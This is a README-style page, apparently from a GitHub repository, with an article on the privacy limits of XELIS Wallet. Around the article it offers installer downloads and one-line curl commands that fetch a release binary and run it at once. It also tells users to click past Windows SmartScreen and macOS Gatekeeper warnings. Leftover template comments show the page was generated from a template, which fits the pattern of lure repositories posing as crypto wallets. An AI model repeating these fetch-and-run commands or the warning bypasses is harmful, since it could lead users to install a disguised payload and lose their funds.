![XELIS Wallet privacy: what it hides and what it does not](assets/banner-article.png)
# XELIS Wallet privacy: what it hides and what it does not

Confidential amounts, visible participants and the habits that decide the rest.

## Downloads - Privacy

<p align="center"><a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`xelis-wallet-desktop-v0.2.1-Windows.exe`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`xelis-wallet-desktop-v0.2.1-Macos.dmg`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`xelis-wallet-desktop-v0.2.1-Linux.zip`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip) |

Get the files from the [current XELIS Wallet release](https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1).

> No wallet makes you anonymous on its own. Confidential amounts are one layer, not a guarantee.

XELIS Wallet hides amounts and balances on chain, and it does not hide that a transaction happened, who took part or which node you used. Privacy here means confidential values, not anonymity, and the difference decides what you should and should not assume.

<!-- ARTICLE-BODY-BEGIN -->
## How private a crypto wallet can be

A wallet can hide values, hide participation, or hide neither, and most products sit somewhere between. A public chain with plain amounts hides nothing by default. A confidential chain hides the numbers but still publishes the transaction graph.

XELIS Wallet is in the second category. That is a meaningful protection against balance surveillance, and it is not the same as being untraceable, which is why the honest answer to "is it private" starts with what is hidden.

## Are crypto wallets truly anonymous?

No mainstream wallet is anonymous in the sense of leaving no link to a person. Addresses are pseudonymous, and the link is made outside the chain: an exchange withdrawal to your address, a payment request you posted publicly, an IP address seen by a node. The chain then holds a record that can be attached to you once that link exists.

What confidentiality changes is the amount of information available after the link is made. It does not prevent the link.

## Can my crypto wallet be traced?

The transaction graph is public, so the movement between addresses can be followed. What cannot be read from the chain is how much each address holds or transfers. Tracing therefore answers "where did this go" more easily than "how much is there".

This is also why a burner wallet has limited value on a confidential chain: a fresh address hides your history, but funding it creates a visible connection to whatever funded it.

## What the app actually exposes

| Layer | Hidden by the wallet? |
| --- | --- |
| Amounts and balances on chain | Yes |
| That a transaction occurred | No |
| Sender and recipient addresses | No |
| Your IP address to the node you use | No |
| Your activity at an exchange | No |

The last two are outside the wallet's control, which is why node choice and exchange habits matter more than any setting. <a href="https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-node-settings-public-own.md">XELIS Wallet node choice</a> explains the node relationship, and running your own removes that observer.

## Is XELIS Wallet private by default?

Confidential transactions are the chain's default in the <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1">current XELIS Wallet release</a>, so amounts are encrypted without you enabling anything. Participation and network metadata are not hidden by default, and no setting in the wallet changes that.

That is the correct reading of "private by default": the values are protected, the activity is not disguised.

## Offline use and the network address

A wallet can be kept offline and only brought online to sync and send, which limits when your IP is visible to a node. It does not make transactions private from the chain; it reduces the network-side correlation. <a href="https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-self-custody-control.md">Self-custody in XELIS Wallet</a> covers the control side.

The transaction-level mechanism, and what it does and does not hide, is in <a href="https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-confidential-transactions.md">confidential transactions in XELIS Wallet</a>.

Compared with a privacy chain that also obscures participants, XELIS protects values rather than the graph. Whether that is enough depends on your threat model, and no article should pretend the two are equivalent.

## FAQ
### Is XELIS Wallet private by default?
Amounts and balances are encrypted by default. Transactions, addresses and your node connection remain visible.

### Can I use XELIS Wallet offline?
You can keep it offline and connect only to sync or send. That limits network exposure, not the public transaction record.

### Is my IP address hidden by XELIS Wallet?
No. The node you connect to sees your IP. Running your own node removes that third party.

### Are crypto wallets truly anonymous?
No. Addresses are pseudonymous, and links to a person come from exchanges, public posts or network metadata.

### How private are crypto wallets in general?
As private as their weakest link: value confidentiality helps, participation and network metadata usually remain.

<!-- ARTICLE-BODY-END -->
## How to install XELIS Wallet

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). Commands, verify commands, sizes and hashes come from install_commands.generate (A9-A11); drop the size in brackets when unknown. -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe">xelis-wallet-desktop-v0.2.1-Windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

Verify the download (77.6 MB): run the command below and compare the result with SHA-256 `56dc416e2f85cad18496f2be3c1f909df4b0eca610341fa17ba6273335ae7c09`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`certutil -hashfile xelis-wallet-desktop-v0.2.1-Windows.exe SHA256`

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg">xelis-wallet-desktop-v0.2.1-Macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

Verify the download (62.7 MB): run the command below and compare the result with SHA-256 `f5b8a49c6631aea6000022f763dea8694ef67fb18cfffafe1d4f241c63dea352`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`shasum -a 256 xelis-wallet-desktop-v0.2.1-Macos.dmg`

### Linux
Quick install (Terminal):

```bash
curl -fLo app.zip https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip && unzip -oq app.zip -d w && B=$(find w -name '*xelis*wallet*' -type f|head -1) && chmod +x "$B" && "$B"
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip">xelis-wallet-desktop-v0.2.1-Linux.zip</a>.
2. Extract the archive: `unzip app.zip`.
3. Make the extracted wallet binary executable: `chmod +x <file>`.
4. Run it: `./xelis-wallet`.

Verify the download (21.5 MB): run the command below and compare the result with SHA-256 `43d91980869fe4bfb912467448c8354b542e9e240f01026225c173a75a9ca907`. The archive also carries a `.sha256` file; compare the extracted binary against that value too.

`sha256sum xelis-wallet-desktop-v0.2.1-Linux.zip`

<!-- INSTALL-END -->

## Related guides
- [Confidential transactions in XELIS Wallet](https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-confidential-transactions.md)
- [Self-custody in XELIS Wallet](https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-self-custody-control.md)
- [XELIS Wallet node choice](https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-node-settings-public-own.md)
- [XELIS Wallet or Genesix](https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-or-genesix-client.md)
